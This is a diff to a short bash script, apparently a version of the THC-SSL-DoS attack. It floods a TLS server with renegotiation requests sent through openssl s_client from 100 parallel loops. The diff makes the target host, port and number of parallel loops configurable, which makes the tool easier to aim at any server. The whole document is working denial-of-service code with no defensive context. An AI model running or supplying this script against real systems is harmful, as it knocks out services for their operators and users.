@@ -1,14 +1,19 @@
 #!/bin/bash
 
+target=127.0.0.1
+port=443
+parallel=100
+
+
 thc-ssl-dosit()
 {
     while :;
     do
-        (while :; do echo R; done) | openssl s_client -connect 127.0.0.1:443 2>/dev/null;
+        (while :; do echo R; done) | openssl s_client -connect $target:$port 2>/dev/null;
     done
 }
 
-for x in `seq 1 100`;
+for x in `seq 1 $parallel`;
 do
     thc-ssl-dosit &
 done
